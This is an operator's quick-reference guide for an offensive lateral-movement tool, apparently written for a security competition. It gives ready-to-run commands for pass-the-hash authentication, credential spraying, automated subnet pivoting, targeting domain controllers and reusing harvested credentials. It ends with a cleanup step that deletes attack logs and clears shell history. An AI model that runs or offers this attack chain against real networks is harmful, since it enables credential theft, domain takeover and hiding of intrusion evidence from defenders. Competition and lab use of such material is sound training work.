# Lateral Movement Tool - Quick Reference Guide

## Installation
```bash
pip3 install impacket
chmod +x lateral_movement_tool.py
```

## Basic Commands

### Single Target Test
```bash
# With password
./lateral_movement_tool.py -t 192.168.1.100 -u admin -p 'Pass123' -d CORP

# With NTLM hash
./lateral_movement_tool.py -t 192.168.1.100 -u admin -H ':31d6cfe0d16ae931b73c59d7e0c089c0' -d CORP
```

### Automated Lateral Movement
```bash
./lateral_movement_tool.py \
    -t 192.168.1.100 \
    -u admin \
    -p 'Pass123' \
    -d CORP \
    --subnet 192.168.1.0/24 \
    --auto-pivot \
    --max-depth 3 \
    -o report.json
```

### Credential Spraying
```bash
# Create creds.json
cat > creds.json << EOF
[
  {"username": "admin", "password": "Pass123", "domain": "CORP"},
  {"username": "user1", "ntlm_hash": "31d6cfe0d16ae931b73c59d7e0c089c0", "domain": "CORP"}
]
EOF

# Create targets.txt
cat > targets.txt << EOF
192.168.1.100
192.168.1.101
192.168.1.102
EOF

# Execute spray
./lateral_movement_tool.py --targets targets.txt --creds-file creds.json --spray
```

## Competition Workflow

### Phase 1: Initial Foothold
```bash
# Test initial credentials
./lateral_movement_tool.py -t <INITIAL_TARGET> -u <USER> -p <PASS> -d <DOMAIN> -v

# Look for shares and logged-on users
# Check output for high-value targets
```

### Phase 2: Rapid Expansion
```bash
# Automated pivot with network discovery
./lateral_movement_tool.py \
    -t <INITIAL_TARGET> \
    -u <USER> \
    -p <PASS> \
    -d <DOMAIN> \
    --subnet <SUBNET>/24 \
    --auto-pivot \
    --max-depth 2 \
    -o phase2_report.json
```

### Phase 3: Target Domain Controllers
```bash
# DCs are automatically prioritized
# Check pivot_report.json for compromised DCs
jq '.compromised_hosts' pivot_report.json

# Manual DC targeting if needed
./lateral_movement_tool.py -t <DC_IP> -u <ADMIN_USER> -H <HASH> -d <DOMAIN>
```

### Phase 4: Extract Credentials
```bash
# Discovered credentials are saved to:
cat discovered_creds.json

# Use for further attacks
./lateral_movement_tool.py --spray --creds-file discovered_creds.json --targets targets.txt
```

## Common Hash Operations

### Extracting Hashes from Output
```bash
# If you captured secretsdump output:
grep ':1001:' output.txt | cut -d: -f4 > nt_hashes.txt
```

### Using Hashes
```bash
# NT hash only (most common)
-H ':31d6cfe0d16ae931b73c59d7e0c089c0'

# LM:NT format
-H 'aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# Just NT hash (no colon)
-H '31d6cfe0d16ae931b73c59d7e0c089c0'
```

## Network Discovery

### Quick Scan for SMB Hosts
```bash
nmap -p445 --open 192.168.1.0/24 -oG - | grep 'open' | awk '{print $2}' > smb_hosts.txt
```

### Identify Domain Controllers
```bash
nmap -p389,636,88,3268 192.168.1.0/24 --open
# Hosts with LDAP (389) and Kerberos (88) are likely DCs
```

## Troubleshooting Quick Fixes

### Connection Refused
```bash
# Check if target is up
ping <TARGET>

# Check if SMB is open
nmap -p445 <TARGET>
```

### Authentication Failed
```bash
# Test credentials manually
smbclient -L //<TARGET> -U '<DOMAIN>\<USER>%<PASS>'

# For hash-based auth
pth-smbclient -L //<TARGET> --user=<USER> --pw-nt-hash -m '<HASH>'
```

### Import Errors
```bash
# Reinstall impacket
pip3 uninstall impacket
pip3 install impacket

# Check Python path
which python3
python3 -c "import sys; print('\n'.join(sys.path))"
```

## Output Files

| File | Description |
|------|-------------|
| `pivot_report.json` | Main report with all findings |
| `discovered_creds.json` | All harvested credentials |
| `spray_results.json` | Credential spray results |

## Common Parameters

| Parameter | Description | Example |
|-----------|-------------|---------|
| `-t` | Target host | `-t 192.168.1.100` |
| `-u` | Username | `-u administrator` |
| `-p` | Password | `-p 'Password123'` |
| `-H` | NTLM hash | `-H ':31d6cfe...'` |
| `-d` | Domain | `-d CORP` |
| `--subnet` | Network range | `--subnet 192.168.1.0/24` |
| `--auto-pivot` | Enable automation | `--auto-pivot` |
| `--max-depth` | Pivot depth | `--max-depth 3` |
| `--spray` | Spray mode | `--spray` |
| `-v` | Verbose output | `-v` |
| `-o` | Output file | `-o report.json` |

## Competition Tips

1. **Start Fast**: Use `--auto-pivot` immediately with initial creds
2. **Go Wide**: Scan entire subnet to find all hosts
3. **Prioritize DCs**: Domain Controllers = most valuable
4. **Track Progress**: Use `-o` to save reports regularly
5. **Credential Reuse**: Export and reuse discovered credentials
6. **Stealth vs Speed**: In competitions, speed usually wins
7. **Document Everything**: Save all output for post-competition reports

## One-Liner for Quick Start
```bash
# Complete attack chain in one command
./lateral_movement_tool.py -t <TARGET> -u <USER> -p <PASS> -d <DOMAIN> --subnet <SUBNET>/24 --auto-pivot --max-depth 3 -v 2>&1 | tee attack.log
```

## Exit Codes
- `0`: Success
- `1`: Authentication failure
- `2`: Network error
- `3`: Permission denied

## Cleanup
```bash
# Remove all generated files
rm -f pivot_report.json discovered_creds.json spray_results.json attack.log

# Clear shell history
history -c && history -w
```